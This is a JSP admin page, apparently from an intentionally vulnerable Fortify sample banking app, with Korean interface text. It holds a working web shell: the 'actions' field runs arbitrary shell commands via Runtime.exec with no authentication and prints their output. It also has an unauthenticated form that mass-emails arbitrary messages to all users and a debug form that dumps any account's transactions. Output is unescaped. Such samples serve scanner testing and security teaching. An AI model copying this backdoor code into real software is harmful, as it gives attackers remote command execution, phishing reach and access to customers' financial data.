<form method=get action='hidden_AdminControl.jsp'>
쉘 명령<br />
<input name='actions' type=text size="80"><br/>
<input type=submit value='Execute'><br /><br />
자동화된 종료 메시지 (기본적으로 모든 사람에게 전송됨)<br />
<input name='message' type=text size="80"><br />
<p><i>특정 사용자에게 보내기 (세미콜론으로 구분된 리스트)</i><br />
<input name='users' type=text size="80"/><br/>

<input type=submit value='Broadcast Alert'>

<%@ page import="java.io.*" %>
<%@ page import="java.util.Iterator" %>
<%@ page import="java.util.List" %>
<%@ page import="com.fortify.samples.riches.oper.*" %>
<%@ page import="com.fortify.samples.riches.model.*" %>

<% String alertMessage = request.getParameter("message");
   int messageCount = 0;

   if ((alertMessage != null) && (alertMessage.length() > 0))
	   {
	   SendMessage msgClass = new SendMessage();
	   String specifiedUsers = request.getParameter("users");
	   if ((specifiedUsers != null) && (specifiedUsers.length() > 0))
			{
			pageContext.getOut().print("<h1>사용자에게 긴급 방송이 전송되었습니다:</h1><pre>");

			String[] users = specifiedUsers.split(";");
			for (int index=0; index < users.length; index++)
				{
				String emailAddress = users[index];
				pageContext.getOut().println(emailAddress);

				msgClass.setTo(emailAddress);
				msgClass.setSubject("기술적 문제");

				String processedMessage = alertMessage.replaceAll("<code1>",
					"현재 시스템에 기술적인 문제가 있습니다.");

				msgClass.setBody(processedMessage);
				msgClass.setSeverity("Highest");
				msgClass.execute();
				messageCount++;
				}
			pageContext.getOut().println("</pre>");
			}
	   else
		   {
		   // Iterate through all users in the system
		   List emailAddresses = ProfileService.getAllEmail();

		   for (Iterator it = emailAddresses.iterator(); it.hasNext();)
				{
			   String emailAddress = (String)it.next();
			   msgClass.setTo(emailAddress);
			   msgClass.setSubject("기술적 장애");

			   String processedMessage = alertMessage.replaceAll("Code1",
					"현재 시스템에 기술적인 문제가 있습니다.");

			   msgClass.setBody(processedMessage);
			   msgClass.setSeverity("Highest");
			   msgClass.execute();
			   messageCount++;
				}

			pageContext.getOut().flush();
			pageContext.getOut().println("<h1>긴급 메시지가 <i>"+messageCount+"</i> 사용자에게 전송되었습니다.</h1><br/>");
		   }
		}
%>
<%
   String cmd = request.getParameter("actions");

   if ((cmd != null) && (cmd.length() > 0))
   {
      String s = null;
      try
	  {
	     String[] commands = cmd.split(";");

		 for (int index=0; index < commands.length; index++)
		 {
			 String output = "";
			 String command = "";
		     command = commands[index];

			 String runtimeCommand = "";
			 if (System.getProperty("os.name").startsWith("Windows"))
				runtimeCommand = "cmd.exe /C " + command;
			 else
			    runtimeCommand = command;

			 Process p = Runtime.getRuntime().exec(runtimeCommand);
			 BufferedReader sI = new BufferedReader(new InputStreamReader(p.getInputStream()));
			 while((s = sI.readLine()) != null)
			 {
				output += s;
				output += "\r\n";
			 }
			 pageContext.getOut().flush();
			 pageContext.getOut().println("<h1>명령 <i>"+command+"</i>으로부터의 응답</h1><br/>");
			 pageContext.getOut().println("<pre>" + output + "</pre>");
		 }
      }
      catch(IOException e)
	  {

      }
   }
%>
<%
   String accountNumber = request.getParameter("acctno");
   if ((accountNumber != null) && (accountNumber.length() > 0))
   {
		Long account = Long.valueOf(accountNumber);
		List transactions = TransactionService.getTransactions(account);

		pageContext.getOut().println("<h1>Transactions reported from database for account <i>"+accountNumber+"</i></h1>");

		try
		{
		for (Iterator it = transactions.iterator(); it.hasNext();)
				{
			    Transaction transaction = (Transaction)it.next();
				String transactionDescription = "Transaction reported ["+transaction.getId()+"]: "
				+ "Account "+ transaction.getAcctno() + "; "
				+ "Amount " + transaction.getAmount() + "; "
				+ "Date " + transaction.getDate() + "; "
				+ "Description " + transaction.getDescription();

				pageContext.getOut().flush();
				pageContext.getOut().println("<pre>"+transactionDescription+"</pre>");
				}
		}
		catch (Exception e)
		{

		}
   }
%>
<br /><br /><b>Debug Code</b><br />
<i>Note: This code should be removed once debugging is complete for bug 192203 (inspection of database contents)</i><br />
Account Number <input name='acctno' type=text size="15"/><br />
<input type=submit value='Retrieve'>
</form>
